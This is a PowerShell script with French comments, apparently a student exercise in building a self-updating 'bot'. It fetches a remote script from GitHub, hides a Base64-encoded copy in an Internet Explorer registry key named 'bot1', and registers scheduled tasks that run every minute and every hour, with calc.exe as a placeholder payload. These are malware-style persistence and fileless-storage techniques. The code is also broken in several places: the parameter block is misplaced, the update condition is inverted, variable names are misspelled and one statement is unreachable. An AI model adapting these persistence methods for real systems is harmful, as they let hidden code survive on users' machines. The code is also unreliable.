Import-Module "c:\lib\script1.ps1"

Param(
[String]$option
)
<# variables #>
##Paramètres de la clé registre crée
 $cheminCle = 'registry::HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main'
 $nomCle    = 'bot1'
 $typeCle   = "String"



Function recupscript($hash,$vaActuelle, $convert64) {
#Chemin du script
$gitLink   = 'https://raw.githubusercontent.com/theurtebize/majBOT/master/script.ps1'

##Paramètres de la clé registre crée
#$cheminCle = 'registry::HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main'
#$nomCle    = 'bot1'
#$typeCle   = "String"

#Récupération du git
$recupGit = Invoke-WebRequest -Uri $gitLink -UseBasicParsing 

# Conversion en Base64
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($recupGit)
$convert64 =[Convert]::ToBase64String($Bytes)
#$convert64

#Création du hash
$sha256 = New-Object -TypeName System.Security.Cryptography.SHA256CryptoServiceProvider
$utf8 = New-Object -TypeName System.Text.UTF8Encoding
$hash = [System.BitConverter]::ToString($sha256.ComputeHash($utf8.GetBytes($convert64)))

#Récupération du hash actuel et sauvegarde dans une nouvelle clé registre
try{
    Get-ItemProperty $cheminCle | Select-Object -ExpandProperty valActuelle -ErrorAction Stop | Out-Null
    $valActuelle = Get-ItemPropertyValue -Path $cheminCle -Name valActuelle
}catch{
    New-ItemProperty -Path $cheminCle -Name valActuelle -PropertyType String -Value $hash
}
    return $convert64
    echo "je suis bien passé dans recupscript"
}


Function update($hash,$vaActuelle) {

#$cheminCle = 'registry::HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main'
#$nomCle    = 'bot1'
#$typeCle   = "String"
#Mise à jour si besoin avec comparaison 
if ($hash -ne $valActuelle){
    #Ne rien faire
}else{
    #Création de la nouvelle clé registre
    try {
        Get-ItemProperty $cheminCle | Select-Object -ExcludeProperty bot1 -ErrorAction Stop | Out-Null
        Set-ItemProperty -Path $cheminCle -Name bot1 -Value $convert64
    }catch{
        New-ItemProperty -Path $cheminCle -Name bot1 -PropertyType String -Value $convert64
    }

    echo "je suis bien passé dans update"
}
}

#Création de la tache 

Function createtache {
    $tache = New-ScheduledTaskAction -Execute "calc.exe" 
    $date = New-ScheduledTaskTrigger -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1) -Once
    $nomTache = "test"
    $testNom = Get-ScheduledTask $nomTache | Select -ExpandProperty Taskname


    if( $testNom -eq $nomTache){
    #On ne fait rien
    }else{
    Register-ScheduledTask -TaskName $nomTache -Trigger $date -Action $tache -Description "Ouverture de la calculatrice" Task

    echo "je suis bien passé dans createtache"
}
}

#Création de la tache de mise à jour du scripte

Function createtacheupdate {

    $tache = New-ScheduledTaskAction -Execute "calc.exe" 
    $date = New-ScheduledTaskTrigger -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 60) -Once
    $nomTache = "updateScript"
    $testNom = Get-ScheduledTask $nomTache | Select -ExpandProperty Taskname


    if( $testNom -eq $nomTache){
    #On ne fait rien
    }else{
    Register-ScheduledTask -TaskName $nomTache -Trigger $date -Action $tache -Description "Mise à jour du script" Task

    echo "Je suis bien passé dans creatacheupdate"
}
}

switch ($option){

    recupscript {recupscript}
    update {update}
    createtache {createtache}
    createtacheupdate {createtacheupdate }

}

recupscript
update
